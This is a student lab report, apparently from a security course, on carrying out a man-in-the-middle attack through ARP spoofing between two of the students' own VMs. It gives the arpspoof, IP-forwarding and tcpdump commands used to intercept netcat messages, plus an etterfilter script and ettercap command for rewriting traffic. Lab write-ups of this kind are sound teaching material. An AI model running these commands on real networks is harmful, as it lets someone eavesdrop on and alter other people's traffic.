# PCS Project 2- Part 1: Hands-on experience with launching MITM attack to eavesdrop on the
network communication.

## A. Team Information:

* Bhargavi Poyekar: CH33454
* Smit Patne: WD31175

## B. Commands invoked on attacker VM for ARP spoofing/poisoning:

    Attacker Machine: 133.228.83.1 => Smit's Kali Machine.
    User 1: 133.228.86.2 => Bhargavi's Ubuntu 22
    User 2: 133.228.86.3 => Bhargavi's Ubuntu 20.

    1. sudo arpspoof -i eth1 -t 133.228.86.2 -r 133.228.86.3

        => Arpspoof utility is used to redirect traffic from 133.228.86.2 
        and 133.228.86.3 to attacker machine 
        => -i just tells the interface.
        => -t specifies the target.
        => r specifies host. 

    2. sudo sysctl -w net.ipv4.ip_forward=1

        => Enables IP forwarding. 
        => Allows attacker machine to forward traffic between 
        target machines.

    3. sudo tcpdump -i eth1 -s0 'tcp and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0) 
    and host 133.228.86.2 and host 133.228.86.3' -w mitm.pcap

        => tcpdump to capture the non-empty tcppackets between both the Users.

## C. Netcat commands used on two VMs:

    User 1 (133.228.86.2): nc 133.228.86.3 22222

        => Communicate with User 2 on port 22222. 

    User 2 (133.228.86.3): nc -l 22222

        => Make port 22222 to listen. 

## D. Data communicated between users on two VMs:

    User 1 sent => Hello 86.3, I am 86.2
    User 2 reply => Hii, Nice to meet you!!

## E. Communication captured by attacker:

    Read Tcp Dump: 

        sudo tcpdump -X -r mitm.pcap

        => r : for reading the captured packet.
        => X : Read in ASCII format so that we can identify the message. 
    
    Packet Details: 

        1. The msg sent by user 1 is captured in packet => 19:28:16.032753 and 19:28:16.032782 on line number 1065 and 1071
        respectively in the tcpdump file. 

        2. The msg sent by user 2 is captured in packet => 19:28:27.357079 and 19:28:27.357084 on line number 1863 and 1869
        respectively in the tcpdump file. 

        => We couldn't find the packet number because we didn't use -v and hence, the tcpdump didn't capture the packet number 
        in the pcap file. 

        Double Capture:
        => Both the message packets were captured twice. All the packets beteen Users are going through Attacker Machine.
        Hence, the attacker machine recieves a packet and then fowards the packet. This is the reason tcpdump captures it twice,
        once when it is received and once when it is forwarding.

## F. Options for Double Capture:

    We tried to capture the packets only once, but to do capture only once, we have to specify source as the User Ip address,
    which doesn't capture 2 way communication. 

## G. Challenges Faced:

    1. We didn't face challenge in the actual assignment, but the bonus part is tricky.
    We tried using ettercap for the modification. But most of the resources of ettercap uses the GUI interface
    and when we tried to start the GUI in Kali-linux machine, it was not allowing. We were getting errors. We tried
    debugging it by trying to install other required libraries, but it still didn't work.

    2. We also tried etterfilter and used it with ettercap text only mode. But the command of ettercap was giving 
    constant syntax error for the command, and we couldn't debug it.

    With the etterfilter, we created ig.filter file, where we wrote the if condition fo replacing the text in message.

        => Content of ig.filter

        if (ip.proto==TCP)
        {
                if (search(DATA.data, "Bhargavi"))
                {
                        replace("Bhargavi","Professor");
                }
        }

        => Commands used:

            -> sudo etterfilter ig.filter -o ig.ef
                => Creates ig.ef as output file which is used in the ettercap command for filtering.

            -> sudo ettercap -T -F ig.ef -M ARP /133.228.86.2,133.228.86.3/ // 

                => -T : Text-only Mode 
                => -F : Specified the filter 
                => -M : specifies Arp poisoning.
                => //// => This was giving the error, it said, incorrect number of tokens,
                but all the references that we tried referring were doing it in the same way.                                           

## H. Summary:

    1. We understood how Man in the Middle Attack can be perfomed using ARP Spoofing. 
    2. We understood how arpspoof utility can be used to redirect the traffic and how exactly it works.
    3. We also got to know why the packets are captured twice in tcpdump. 
    4. We got to know various tools that can be used for MITM modification like Ettercap, Buttercap, etc.

## I. References:

    1. Professor's Document for the Project.
    2. https://tutorialedge.net/security/arp-spoofing-for-mitm-attack-tutorial/
    3. https://linux.die.net/man/8/tcpdump
    4. https://www.hostinger.com/tutorials/grep-command-in-linux-useful-examples/#:~:text=Grep%2C%20or%20global%20regular%20expression,any%20lines%20that%20contain%20it.
    5. https://linux.die.net/man/8/ettercap
    6. https://linux.die.net/man/8/etterfilter














